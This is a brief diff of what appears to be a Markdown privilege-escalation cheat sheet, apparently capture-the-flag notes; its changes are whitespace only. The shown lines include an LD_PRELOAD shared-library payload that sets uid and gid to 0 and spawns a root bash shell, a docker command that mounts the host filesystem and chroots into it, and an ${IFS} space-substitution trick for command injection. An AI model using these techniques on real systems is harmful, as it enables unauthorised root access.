@@ -201,10 +201,10 @@ nano shell.c
 #include <stdlib.h>
 
 void _init() {
-	unsetenv("LD_PRELOAD");
-	setgid(0);
-	setuid(0);
-	system("/bin/bash");
+  unsetenv("LD_PRELOAD");
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
 }
 
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
@@ -512,6 +512,7 @@ docker run -v /:/mnt --rm -it alpine(or bash) chroot /mnt sh
 ```
 
 - ConvertMyVideo
+
 ```bash
 ${IFS} = using as space
 
